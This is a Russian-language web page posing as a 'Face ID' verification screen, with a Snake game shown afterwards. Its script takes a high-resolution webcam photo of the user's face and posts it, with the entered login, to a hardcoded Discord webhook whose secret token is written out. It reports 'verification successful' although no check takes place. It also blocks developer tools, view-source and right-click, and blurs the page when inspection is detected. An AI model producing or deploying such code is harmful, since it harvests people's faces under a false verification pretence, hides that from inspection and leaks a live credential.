<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>✨ Face ID Verify</title>
  <style>
    :root {
      --bg1: #0a0019; --bg2: #001428; --bg3: #1a0033;
      --card: #14141a; --border: #2a2a3a;
      --blue: #0a84ff; --green: #30d158; --purple: #bf5af2; --pink: #ff375f;
      --txt: #fff; --sub: #8e8e93;
      --font: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
      --glow: 0 0 40px rgba(191,90,242,0.4);
      --shadow: 0 12px 40px rgba(0,0,0,0.5);
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    
    body {
      background: linear-gradient(125deg, var(--bg1), var(--bg2), var(--bg3), var(--bg1));
      background-size: 400% 400%;
      animation: gradientFlow 20s ease infinite;
      color: var(--txt);
      font-family: var(--font);
      height: 100dvh;
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
    }
    @keyframes gradientFlow { 0%,100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
    
    .particles { position: fixed; inset: 0; pointer-events: none; z-index: -1; }
    .particle {
      position: absolute; width: 4px; height: 4px;
      background: radial-gradient(circle, var(--purple), transparent 70%);
      border-radius: 50%; animation: float 15s infinite ease-in-out;
      opacity: 0.6; filter: blur(0.3px);
    }
    @keyframes float {
      0%,100% { transform: translateY(100vh) scale(0); opacity: 0; }
      10% { opacity: 0.6; }
      50% { transform: translateY(40vh) scale(1); opacity: 0.8; }
      90% { opacity: 0.6; }
    }
    .sparkle {
      position: absolute; width: 8px; height: 8px; background: #fff;
      border-radius: 50%; animation: sparkleAnim 1.5s ease-out forwards; pointer-events: none; z-index: 100;
    }
    @keyframes sparkleAnim {
      0% { transform: scale(0) rotate(0deg); opacity: 1; }
      50% { opacity: 1; }
      100% { transform: scale(2) rotate(180deg); opacity: 0; }
    }

    #dynamic-island {
      position: fixed; top: 14px; left: 50%; transform: translateX(-50%);
      width: 126px; height: 37px; background: #000; border: 1px solid #1a1a1a;
      border-radius: 20px; z-index: 999; display: flex; align-items: center; justify-content: center;
      overflow: hidden; transition: all 0.7s cubic-bezier(0.34, 1.56, 0.64, 1);
      box-shadow: var(--shadow), 0 0 25px rgba(0,0,0,0.7);
    }
    #dynamic-island.expanded {
      width: 360px; height: 500px; border-radius: 42px;
      box-shadow: var(--glow), var(--shadow); border-color: #2a2a4a;
    }
    #dynamic-island .island-inner {
      opacity: 0; width: 100%; height: 100%;
      display: flex; flex-direction: column; align-items: center; justify-content: center;
      transition: opacity 0.5s 0.2s; position: relative;
      background: rgba(0,0,0,0.9); backdrop-filter: blur(25px); padding: 20px;
    }
    #dynamic-island.expanded .island-inner { opacity: 1; }

    .face-area {
      position: relative; width: 260px; height: 260px; margin: 10px 0 20px;
      animation: pulseGlow 3s ease-in-out infinite;
    }
    @keyframes pulseGlow {
      0%,100% { filter: drop-shadow(0 0 12px rgba(191,90,242,0.4)); }
      50% { filter: drop-shadow(0 0 30px rgba(191,90,242,0.7)); }
    }
    #webcam {
      width: 100%; height: 100%; object-fit: cover; border-radius: 50%;
      transform: scaleX(-1); transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
      border: 4px solid transparent;
      background: linear-gradient(#000,#000) padding-box, linear-gradient(135deg, var(--blue), var(--purple), var(--pink)) border-box;
    }
    #webcam.ready { border-color: var(--green); }
    #webcam.captured { opacity: 0; transform: scaleX(-1) scale(0.2) rotate(15deg); filter: blur(6px); }

    .face-gui { position: absolute; inset: -24px; width: calc(100% + 48px); height: calc(100% + 48px); pointer-events: none; }
    .bracket { fill: none; stroke: #4a4a6a; stroke-width: 5; stroke-linecap: round; stroke-linejoin: round; transition: stroke 0.3s, filter 0.3s; }
    .bracket.active { stroke: var(--purple); filter: drop-shadow(0 0 8px var(--purple)); }
    .progress-ring { fill: none; stroke: var(--green); stroke-width: 6; stroke-linecap: round; filter: drop-shadow(0 0 12px rgba(48,209,88,0.8)); transition: stroke-dashoffset 0.3s ease; }
    
    .face-dot {
      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0);
      width: 14px; height: 14px; background: var(--green); border-radius: 50%;
      box-shadow: 0 0 25px var(--green); transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1); z-index: 5;
    }
    .face-dot.visible { transform: translate(-50%, -50%) scale(1); animation: dotPulse 1.5s infinite; }
    @keyframes dotPulse { 0%,100% { opacity: 1; } 50% { opacity: 0.6; } }

    .capture-btn {
      width: 80px; height: 80px; border-radius: 50%;
      background: linear-gradient(135deg, var(--blue), var(--purple));
      border: 5px solid #fff; color: #fff; font-size: 2rem; cursor: pointer;
      display: flex; align-items: center; justify-content: center;
      transition: all 0.2s cubic-bezier(0.34, 1.56, 0.64, 1);
      box-shadow: 0 8px 30px rgba(10,132,255,0.5); margin: 10px 0; position: relative; overflow: hidden;
    }
    .capture-btn::before {
      content: ''; position: absolute; inset: -3px; border-radius: 50%;
      background: linear-gradient(135deg, var(--purple), var(--pink), var(--blue), var(--purple));
      background-size: 300% 300%; animation: borderFlow 3s linear infinite; opacity: 0; transition: opacity 0.2s;
    }
    .capture-btn:hover::before { opacity: 1; }
    .capture-btn:active { transform: scale(0.9); }
    .capture-btn:disabled { opacity: 0.35; cursor: not-allowed; transform: none; box-shadow: none; }
    .capture-btn.capturing { animation: captureFlash 0.4s ease-out; }
    @keyframes borderFlow { 0% { background-position: 0% 50%; } 100% { background-position: 200% 50%; } }
    @keyframes captureFlash {
      0% { box-shadow: 0 0 0 0 rgba(255,255,255,0.6); }
      50% { box-shadow: 0 0 0 35px rgba(255,255,255,0); }
      100% { transform: scale(0.95); }
    }

    .check-wrap {
      position: absolute; inset: 0; display: flex; align-items: center; justify-content: center;
      opacity: 0; transform: scale(0.2) rotate(-30deg);
      transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1); pointer-events: none; z-index: 20;
    }
    .check-wrap.show { opacity: 1; transform: scale(1) rotate(0deg); animation: checkBounce 0.7s ease-out; }
    @keyframes checkBounce {
      0%,100% { transform: scale(1) rotate(0deg); }
      40% { transform: scale(1.15) rotate(3deg); }
      70% { transform: scale(0.95) rotate(-1deg); }
    }
    .check-circle {
      width: 110px; height: 110px; background: linear-gradient(135deg, var(--green), #20c964);
      border-radius: 50%; display: flex; align-items: center; justify-content: center;
      box-shadow: 0 10px 40px rgba(48,209,88,0.6), 0 0 60px rgba(48,209,88,0.4);
      animation: checkGlow 2.5s ease-in-out infinite;
    }
    @keyframes checkGlow {
      0%,100% { box-shadow: 0 10px 40px rgba(48,209,88,0.6), 0 0 60px rgba(48,209,88,0.4); }
      50% { box-shadow: 0 10px 40px rgba(48,209,88,0.9), 0 0 90px rgba(48,209,88,0.7); }
    }
    .check-path {
      width: 55px; height: 55px; fill: none; stroke: #000; stroke-width: 7;
      stroke-linecap: round; stroke-linejoin: round; stroke-dasharray: 70; stroke-dashoffset: 70;
    }
    .check-path.draw { animation: drawCheck 0.5s 0.3s forwards ease-out; }
    @keyframes drawCheck { to { stroke-dashoffset: 0; } }

    .fi-status {
      font-size: 1.05rem; color: var(--sub); text-align: center; min-height: 26px;
      margin-top: 14px; transition: all 0.3s;
    }
    .fi-status.done { color: var(--green); font-weight: 600; }
    .fi-status.highlight { color: var(--purple); }
    .fi-status.error { color: var(--pink); }

    #login-view {
      display: flex; flex-direction: column; align-items: center; gap: 22px;
      animation: slideUpFade 0.5s ease; z-index: 10;
    }
    @keyframes slideUpFade { from { opacity: 0; transform: translateY(35px); } to { opacity: 1; transform: translateY(0); } }
    #login-view h2 {
      font-size: 2.4rem; font-weight: 700;
      background: linear-gradient(135deg, var(--txt), var(--purple));
      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
      text-shadow: 0 3px 25px rgba(0,0,0,0.4);
    }
    #login-view p { color: var(--sub); font-size: 1.05rem; text-align: center; max-width: 300px; line-height: 1.4; }
    .login-form {
      background: var(--card); width: 100%; max-width: 340px; padding: 30px; border-radius: 26px;
      display: flex; flex-direction: column; gap: 18px; border: 1px solid var(--border);
      box-shadow: var(--shadow), 0 0 40px rgba(191,90,242,0.2); animation: cardFloat 7s ease-in-out infinite;
    }
    @keyframes cardFloat { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
    input {
      width: 100%; background: #1a1a24; border: 1px solid var(--border); padding: 16px;
      border-radius: 16px; color: var(--txt); font-size: 1.05rem; outline: none; transition: all 0.25s;
    }
    input:focus { border-color: var(--blue); box-shadow: 0 0 0 4px rgba(10,132,255,0.25); transform: scale(1.01); }
    input::placeholder { color: var(--sub); }
    .btn-ios {
      background: linear-gradient(135deg, var(--blue), var(--purple)); color: #fff; border: none;
      padding: 16px; border-radius: 18px; font-size: 1.05rem; font-weight: 600; cursor: pointer;
      transition: all 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
      box-shadow: 0 8px 28px rgba(10,132,255,0.45); position: relative; overflow: hidden;
    }
    .btn-ios::after {
      content: ''; position: absolute; inset: 0;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
      transform: translateX(-100%); transition: transform 0.5s;
    }
    .btn-ios:hover::after { transform: translateX(100%); }
    .btn-ios:active { transform: scale(0.97); }
    .btn-ios:disabled { opacity: 0.35; cursor: not-allowed; transform: none; box-shadow: none; }

    #game-screen {
      position: fixed; inset: 0; display: none; flex-direction: column;
      align-items: center; justify-content: center; background: rgba(10,0,25,0.98);
      gap: 18px; z-index: 30;
    }
    #game-screen.active { display: flex; animation: slideUpFade 0.5s ease; }
    .g-ui { display: flex; gap: 14px; width: 100%; max-width: 360px; }
    .g-box {
      background: var(--card); flex: 1; padding: 14px; border-radius: 18px;
      text-align: center; border: 1px solid var(--border);
      transition: transform 0.25s, box-shadow 0.25s;
    }
    .g-box:hover { transform: translateY(-3px); box-shadow: 0 6px 20px rgba(0,0,0,0.4); }
    .g-box span { display: block; font-size: 0.8rem; color: var(--sub); }
    .g-box strong { font-size: 1.4rem; }
    #game-canvas {
      background: rgba(10,10,18,0.97); border-radius: 22px; border: 2px solid var(--border);
      max-width: 92vw; box-shadow: var(--shadow), 0 0 35px rgba(191,90,242,0.25);
    }
    .play-again {
      margin-top: 10px; background: linear-gradient(135deg, var(--blue), var(--purple));
      color: #fff; border: none; padding: 14px 32px; border-radius: 18px;
      font-weight: 600; cursor: pointer; transition: all 0.25s;
      box-shadow: 0 8px 28px rgba(10,132,255,0.45);
    }
    .play-again:hover { transform: translateY(-2px); box-shadow: 0 10px 35px rgba(10,132,255,0.6); }
    .play-again:active { transform: scale(0.98); }

    .toast {
      position: fixed; top: 85px; left: 50%; transform: translateX(-50%) translateY(-25px);
      background: var(--card); color: var(--txt); padding: 14px 28px; border-radius: 20px;
      font-size: 1rem; z-index: 998; border: 1px solid var(--border);
      box-shadow: var(--shadow); animation: toastSlide 0.45s ease forwards;
      max-width: 92vw; text-align: center; backdrop-filter: blur(12px);
    }
    @keyframes toastSlide { to { transform: translateX(-50%) translateY(0); } }
    .toast.success { border-color: var(--green); box-shadow: 0 8px 30px rgba(48,209,88,0.4); }
    .toast.error { border-color: var(--pink); box-shadow: 0 8px 30px rgba(255,55,95,0.4); }
    .toast.sending { border-color: var(--blue); }

    .loader { display: inline-flex; gap: 5px; align-items: center; }
    .loader span {
      width: 7px; height: 7px; background: var(--purple); border-radius: 50%;
      animation: loaderDot 1.5s infinite ease-in-out;
    }
    .loader span:nth-child(2) { animation-delay: 0.2s; }
    .loader span:nth-child(3) { animation-delay: 0.4s; }
    @keyframes loaderDot {
      0%,80%,100% { transform: scale(0.5); opacity: 0.5; }
      40% { transform: scale(1); opacity: 1; }
    }
  </style>
</head>
<body>
  <div class="particles" id="particles"></div>

  <!-- Dynamic Island -->
  <div id="dynamic-island">
    <div class="island-inner">
      <div class="face-area">
        <video id="webcam" autoplay playsinline muted></video>
        <div class="face-dot" id="face-dot"></div>
        <svg class="face-gui" viewBox="0 0 308 308">
          <path class="bracket" id="b1" d="M40 62 L40 40 L62 40" />
          <path class="bracket" id="b2" d="M268 62 L268 40 L246 40" />
          <path class="bracket" id="b3" d="M40 246 L40 268 L62 268" />
          <path class="bracket" id="b4" d="M268 246 L268 268 L246 268" />
          <circle class="progress-ring" id="progress-ring" cx="154" cy="154" r="130" />
        </svg>
        <div class="check-wrap" id="check-wrap">
          <div class="check-circle">
            <svg class="check-path" viewBox="0 0 70 70"><path d="M18 35 L30 47 L52 23"></path></svg>
          </div>
        </div>
      </div>
      <button class="capture-btn" id="capture-btn" disabled>📸</button>
      <div class="fi-status" id="fi-status"><span class="loader"><span></span><span></span><span></span></span></div>
    </div>
  </div>

  <!-- Login -->
  <div id="login-view">
    <h2>✨ Face ID</h2>
    <p>Введите логин → поставьте лицо в рамку → нажмите 📸<br>Качественное фото отправится в Discord</p>
    <div class="login-form">
      <input type="text" id="login-input" placeholder="Ваш логин" maxlength="24" autocomplete="off">
      <button id="start-btn" class="btn-ios" disabled>Начать верификацию</button>
    </div>
  </div>

  <!-- Game -->
  <div id="game-screen">
    <div class="g-ui">
      <div class="g-box"><span>Счёт</span><strong id="score" style="color:var(--green)">0</strong></div>
      <div class="g-box"><span>Игрок</span><strong id="player">—</strong></div>
      <div class="g-box"><span>Рекорд</span><strong id="highscore" style="color:#ffd60a">0</strong></div>
    </div>
    <canvas id="game-canvas" width="360" height="360"></canvas>
    <button class="play-again" id="restart-btn">🔄 Сыграть ещё</button>
  </div>

  <script>
    // ===== 🛡️ БЛОКИРОВКА F12 & DEVTOOLS =====
    (function() {
      // Блокировка горячих клавиш
      document.addEventListener('keydown', e => {
        const f12 = e.key === 'F12' || e.keyCode === 123;
        const ctrlShiftI = e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i');
        const ctrlShiftJ = e.ctrlKey && e.shiftKey && (e.key === 'J' || e.key === 'j');
        const ctrlShiftC = e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c');
        const ctrlU = e.ctrlKey && (e.key === 'U' || e.key === 'u');
        
        if (f12 || ctrlShiftI || ctrlShiftJ || ctrlShiftC || ctrlU) {
          e.preventDefault();
          e.stopPropagation();
          return false;
        }
      }, true); // capture phase для перехвата раньше браузера

      // Отключение правой кнопки мыши
      document.addEventListener('contextmenu', e => {
        e.preventDefault();
        return false;
      });

      // Детекция DevTools по размеру окна (блурит страницу при открытии)
      setInterval(() => {
        const devToolsOpen = window.outerHeight - window.innerHeight > 180 || 
                             window.outerWidth - window.innerWidth > 180;
        if (devToolsOpen) {
          document.body.style.filter = 'blur(10px) brightness(0.6)';
          document.body.style.pointerEvents = 'none';
          console.clear();
          console.warn('🔒 DevTools запрещены на этом ресурсе.');
        } else {
          document.body.style.filter = 'none';
          document.body.style.pointerEvents = 'auto';
        }
      }, 800);
    })();

    // ===== ФОН =====
    const particlesContainer = document.getElementById('particles');
    for (let i = 0; i < 35; i++) {
      const p = document.createElement('div');
      p.className = 'particle';
      p.style.left = Math.random() * 100 + '%';
      p.style.animationDelay = Math.random() * 15 + 's';
      p.style.animationDuration = (12 + Math.random() * 12) + 's';
      particlesContainer.appendChild(p);
    }
    function createSparkle(x, y) {
      const s = document.createElement('div');
      s.className = 'sparkle';
      s.style.left = x + 'px'; s.style.top = y + 'px';
      document.body.appendChild(s);
      setTimeout(() => s.remove(), 1500);
    }

    // ===== КОНФИГИ =====
    const DB = JSON.parse(localStorage.getItem('face_db') || '{}');
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1494229839152939018/-nnCGIoZcr4xykdYTFXaB-zx4hFVkWH77Hn_B5GUZoWHMqoaxVah2IVvz_XmCwg-Xavn';
    const state = { login: '', mode: 'register', faceDetected: false, stream: null, snapshot: null };

    // ===== DOM =====
    const island = document.getElementById('dynamic-island');
    const loginInput = document.getElementById('login-input');
    const startBtn = document.getElementById('start-btn');
    const webcam = document.getElementById('webcam');
    const fiStatus = document.getElementById('fi-status');
    const captureBtn = document.getElementById('capture-btn');
    const progressRing = document.getElementById('progress-ring');
    const faceDot = document.getElementById('face-dot');
    const brackets = [document.getElementById('b1'), document.getElementById('b2'), document.getElementById('b3'), document.getElementById('b4')];
    const checkWrap = document.getElementById('check-wrap');
    const checkPath = document.querySelector('.check-path');

    const RING_LEN = 2 * Math.PI * 130;
    progressRing.style.strokeDasharray = RING_LEN;
    progressRing.style.strokeDashoffset = RING_LEN;

    // ===== LOGIN =====
    loginInput.addEventListener('input', () => startBtn.disabled = loginInput.value.trim().length < 2);
    startBtn.addEventListener('click', () => {
      state.login = loginInput.value.trim();
      state.mode = DB[state.login] ? 'verify' : 'register';
      fiStatus.innerHTML = '<span class="loader"><span></span><span></span><span></span></span>';
      fiStatus.className = 'fi-status highlight';
      document.getElementById('login-view').style.opacity = '0';
      setTimeout(() => {
        document.getElementById('login-view').style.display = 'none';
        island.classList.add('expanded');
        initCamera();
      }, 300);
    });

    // ===== КАМЕРА =====
    async function initCamera() {
      try {
        state.stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } 
        });
        webcam.srcObject = state.stream;
        webcam.onloadedmetadata = () => {
          fiStatus.textContent = '👁️ Расположите лицо в рамке';
          fiStatus.className = 'fi-status';
          captureBtn.disabled = false;
          startFaceDetection();
        };
      } catch(e) {
        fiStatus.textContent = '❌ Камера недоступна';
        fiStatus.className = 'fi-status error';
      }
    }

    // ===== DETECT FACE =====
    function startFaceDetection() {
      const mCanvas = document.createElement('canvas');
      mCanvas.width = 100; mCanvas.height = 100;
      const mCtx = mCanvas.getContext('2d', { willReadFrequently: true });
      
      function detect() {
        if (!state.stream) return;
        mCtx.drawImage(webcam, 0, 0, 100, 100);
        const data = mCtx.getImageData(0, 0, 100, 100).data;
        let skin = 0, total = 0;
        for (let y = 30; y < 70; y++) {
          for (let x = 30; x < 70; x++) {
            const i = (y * 100 + x) * 4;
            const r = data[i], g = data[i+1], b = data[i+2];
            if (r > 90 && g > 40 && b > 20 && r > g && r > b && (r-g) > 15) skin++;
            total++;
          }
        }
        state.faceDetected = (skin / total) > 0.12;
        faceDot.classList.toggle('visible', state.faceDetected);
        webcam.classList.toggle('ready', state.faceDetected);
        brackets.forEach(b => b.classList.toggle('active', state.faceDetected));
        captureBtn.disabled = !state.faceDetected;
        if (state.faceDetected && +progressRing.style.strokeDashoffset > 0) {
          progressRing.style.strokeDashoffset = Math.max(0, +progressRing.style.strokeDashoffset - 12);
        }
        requestAnimationFrame(detect);
      }
      detect();
    }

    // ===== КАЧЕСТВЕННЫЙ СНИМОК + ОТПРАВКА =====
    captureBtn.addEventListener('click', async () => {
      if (!state.faceDetected) { toast('⚠️ Сначала расположите лицо в рамке', 'error'); return; }
      
      captureBtn.classList.add('capturing');
      createSparkle(captureBtn.offsetLeft + 40, captureBtn.offsetTop + 40);
      await new Promise(r => setTimeout(r, 250));
      
      state.snapshot = await captureHighQualityFace();
      
      webcam.classList.add('captured');
      captureBtn.style.opacity = '0'; captureBtn.style.transform = 'scale(0)';
      fiStatus.textContent = '📤 Отправка в Discord...';
      fiStatus.className = 'fi-status sending';
      
      await sendToDiscordWithPhoto(state.login, state.snapshot, state.mode);
      
      checkWrap.classList.add('show');
      checkPath.classList.add('draw');
      fiStatus.textContent = '✅ Верификация успешна!';
      fiStatus.className = 'fi-status done';
      
      setTimeout(() => {
        island.classList.remove('expanded');
        setTimeout(() => {
          state.stream?.getTracks().forEach(t => t.stop());
          document.getElementById('player').textContent = state.login;
          document.getElementById('game-screen').classList.add('active');
          initGame();
        }, 400);
      }, 1000);
    });

    // ===== 🎯 КАЧЕСТВЕННЫЙ ЗАХВАТ ЛИЦА =====
    async function captureHighQualityFace() {
      return new Promise((resolve) => {
        const SIZE = 512;
        const canvas = document.createElement('canvas');
        canvas.width = SIZE; canvas.height = SIZE;
        const ctx = canvas.getContext('2d');
        ctx.imageSmoothingEnabled = true;
        ctx.imageSmoothingQuality = 'high';
        
        const video = document.getElementById('webcam');
        const vw = video.videoWidth; const vh = video.videoHeight;
        const size = Math.min(vw, vh);
        const sx = (vw - size) / 2; const sy = (vh - size) / 2;
        
        ctx.drawImage(video, sx, sy, size, size, 0, 0, SIZE, SIZE);
        ctx.globalCompositeOperation = 'destination-in';
        ctx.beginPath(); ctx.arc(SIZE/2, SIZE/2, SIZE/2 - 4, 0, Math.PI * 2); ctx.fill();
        ctx.globalCompositeOperation = 'source-over';
        
        ctx.strokeStyle = '#30d158'; ctx.lineWidth = 6; ctx.shadowColor = '#30d158'; ctx.shadowBlur = 20;
        ctx.beginPath(); ctx.arc(SIZE/2, SIZE/2, SIZE/2 - 7, 0, Math.PI * 2); ctx.stroke();
        ctx.shadowBlur = 0;
        
        const gradient = ctx.createRadialGradient(SIZE/2, SIZE/2, 0, SIZE/2, SIZE/2, SIZE/2);
        gradient.addColorStop(0, 'rgba(191,90,242,0.08)');
        gradient.addColorStop(1, 'rgba(10,132,255,0.03)');
        ctx.fillStyle = gradient;
        ctx.beginPath(); ctx.arc(SIZE/2, SIZE/2, SIZE/2 - 8, 0, Math.PI * 2); ctx.fill();
        
        canvas.toBlob((blob) => {
          const reader = new FileReader();
          reader.onloadend = () => resolve(reader.result);
          reader.readAsDataURL(blob);
        }, 'image/png', 1.0);
      });
    }

    // ===== ОТПРАВКА В DISCORD С ФОТО =====
    async function sendToDiscordWithPhoto(username, base64Image, mode) {
      try {
        const base64Data = base64Image.replace(/^data:image\/\w+;base64,/, '');
        const byteCharacters = atob(base64Data);
        const byteArray = new Uint8Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) byteArray[i] = byteCharacters.charCodeAt(i);
        const blob = new Blob([byteArray], { type: 'image/png' });
        
        const formData = new FormData();
        const payload = {
          content: `🔐 **Face ID** — ${mode === 'register' ? '🆕 Регистрация' : '🔓 Вход'}`,
          embeds: [{
            title: mode === 'register' ? '🆕 Новый пользователь' : '🔓 Подтверждение',
            color: mode === 'register' ? 0x30d158 : 0x0a84ff,
            thumbnail: { url: 'attachment://face.png' },
            fields: [
              { name: '👤 Логин', value: `\`${username}\``, inline: true },
              { name: '🔐 Режим', value: `\`${mode}\``, inline: true },
              { name: '🕐 Время', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false },
              { name: '📸 Качество', value: '`512×512 PNG`', inline: true },
              { name: '✅ Статус', value: mode === 'register' ? 'Зарегистрирован' : 'Подтверждён', inline: true }
            ],
            footer: { text: '✨ Face ID Verify • HD Capture', icon_url: 'https://i.imgur.com/7Q3dKxP.png' }
          }]
        };
        formData.append('payload_json', JSON.stringify(payload));
        formData.append('file', blob, 'face.png');
        
        const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
        if (!res.ok) throw new Error(`HTTP ${res.status}: ${await res.text()}`);
        toast('✅ Отправлено в Discord (HD фото)!', 'success');
        console.log('📦 Discord OK');
      } catch (err) {
        console.error('❌ Discord error:', err);
        toast('❌ Ошибка: ' + err.message, 'error');
      }
    }

    // ===== SNAKE (BONUS) =====
    const cvs = document.getElementById('game-canvas');
    const ctx = cvs.getContext('2d');
    const G = 18, COLS = cvs.width/G, ROWS = cvs.height/G;
    let snake, dir, nextDir, food, score, high, gameLoop, spd;

    function initGame() {
      high = +localStorage.getItem('snake_high') || 0;
      document.getElementById('highscore').textContent = high;
      resetGame();
      document.addEventListener('keydown', onKey);
      setupTouch();
      document.getElementById('restart-btn').onclick = () => { resetGame(); toast('🔄 Новая игра!', 'success'); };
    }
    function resetGame() {
      snake = [{x: Math.floor(COLS/2), y: Math.floor(ROWS/2)}];
      dir = nextDir = {x:1,y:0};
      score = 0; document.getElementById('score').textContent = 0;
      spd = 110; placeFood();
      if(gameLoop) clearInterval(gameLoop);
      gameLoop = setInterval(update, spd);
    }
    function placeFood() { let ok; do { food = { x: Math.floor(Math.random()*COLS), y: Math.floor(Math.random()*ROWS) }; ok = !snake.some(s => s.x===food.x && s.y===food.y); } while(!ok); }
    function update() {
      dir = {...nextDir};
      const head = { x: snake[0].x+dir.x, y: snake[0].y+dir.y };
      if (head.x<0 || head.x>=COLS || head.y<0 || head.y>=ROWS || snake.some(s=>s.x===head.x&&s.y===head.y)) return gameOver();
      snake.unshift(head);
      if (head.x===food.x && head.y===food.y) {
        score += 10; document.getElementById('score').textContent = score;
        if(spd > 60) { spd -= 3; clearInterval(gameLoop); gameLoop = setInterval(update, spd); }
        placeFood();
      } else snake.pop();
      draw();
    }
    function draw() {
      ctx.fillStyle = 'rgba(10,10,18,0.98)'; ctx.fillRect(0,0,cvs.width,cvs.height);
      ctx.strokeStyle='#1a1a2e'; ctx.lineWidth=0.5;
      for(let i=0;i<=COLS;i++){ctx.beginPath();ctx.moveTo(i*G,0);ctx.lineTo(i*G,cvs.height);ctx.stroke();}
      for(let i=0;i<=ROWS;i++){ctx.beginPath();ctx.moveTo(0,i*G);ctx.lineTo(cvs.width,i*G);ctx.stroke();}
      ctx.fillStyle='#ff3b30'; ctx.shadowColor='#ff3b30'; ctx.shadowBlur=12;
      ctx.beginPath(); ctx.arc(food.x*G+G/2, food.y*G+G/2, G/2-3, 0, Math.PI*2); ctx.fill(); ctx.shadowBlur=0;
      snake.forEach((seg,i)=>{
        const r = 1 - i/snake.length*0.5;
        ctx.fillStyle = i===0 ? '#30d158' : `rgb(48,${Math.floor(209*r)},${Math.floor(88*r)})`;
        if(i===0) { ctx.shadowColor='#30d158'; ctx.shadowBlur=10; }
        ctx.beginPath(); ctx.roundRect(seg.x*G+2, seg.y*G+2, G-4, G-4, 6); ctx.fill(); ctx.shadowBlur=0;
        if(i===0) {
          ctx.fillStyle='#000'; const cx=seg.x*G+G/2, cy=seg.y*G+G/2;
          let e1x,e1y,e2x,e2y;
          if(dir.x===1){e1x=cx+2;e1y=cy-3;e2x=cx+2;e2y=cy+3;}
          else if(dir.x===-1){e1x=cx-2;e1y=cy-3;e2x=cx-2;e2y=cy+3;}
          else if(dir.y===-1){e1x=cx-3;e1y=cy-2;e2x=cx+3;e2y=cy-2;}
          else{e1x=cx-3;e1y=cy+2;e2x=cx+3;e2y=cy+2;}
          ctx.beginPath(); ctx.arc(e1x,e1y,2.5,0,Math.PI*2); ctx.fill();
          ctx.beginPath(); ctx.arc(e2x,e2y,2.5,0,Math.PI*2); ctx.fill();
        }
      });
    }
    function gameOver() {
      clearInterval(gameLoop);
      if(score > high) { high = score; localStorage.setItem('snake_high', high); document.getElementById('highscore').textContent = high; }
      ctx.fillStyle='rgba(255,59,48,0.18)'; ctx.fillRect(0,0,cvs.width,cvs.height);
      ctx.fillStyle='#fff'; ctx.font='600 30px var(--font)'; ctx.textAlign='center';
      ctx.fillText('GAME OVER', cvs.width/2, cvs.height/2-16);
      ctx.font='400 16px var(--font)'; ctx.fillStyle='#8e8e93';
      ctx.fillText('ПРОБЕЛ — рестарт', cvs.width/2, cvs.height/2+16);
      const h = e => { if(e.code==='Space') { document.removeEventListener('keydown',h); resetGame(); }};
      document.addEventListener('keydown', h);
    }
    function onKey(e) {
      const k=e.code;
      if((k==='ArrowUp'||k==='KeyW')&&dir.y!==1) nextDir={x:0,y:-1};
      else if((k==='ArrowDown'||k==='KeyS')&&dir.y!==-1) nextDir={x:0,y:1};
      else if((k==='ArrowLeft'||k==='KeyA')&&dir.x!==1) nextDir={x:-1,y:0};
      else if((k==='ArrowRight'||k==='KeyD')&&dir.x!==-1) nextDir={x:1,y:0};
      if(k.startsWith('Arrow')) e.preventDefault();
    }
    function setupTouch() {
      let sx,sy;
      cvs.addEventListener('touchstart', e=>{sx=e.touches[0].clientX;sy=e.touches[0].clientY;},{passive:true});
      cvs.addEventListener('touchend', e=>{
        if(!sx) return;
        const dx=e.changedTouches[0].clientX-sx, dy=e.changedTouches[0].clientY-sy;
        if(Math.abs(dx)>Math.abs(dy)){
          if(dx>20&&dir.x!==-1) nextDir={x:1,y:0}; else if(dx<-20&&dir.x!==1) nextDir={x:-1,y:0};
        } else {
          if(dy>20&&dir.y!==-1) nextDir={x:0,y:1}; else if(dy<-20&&dir.y!==1) nextDir={x:0,y:-1};
        }
      },{passive:true});
    }
    function toast(msg, type='success') {
      const t = document.createElement('div');
      t.className = `toast ${type}`; t.textContent = msg;
      document.body.appendChild(t);
      setTimeout(() => { t.style.opacity='0'; setTimeout(()=>t.remove(),350); }, 3000);
    }
  </script>
</body>
</html>
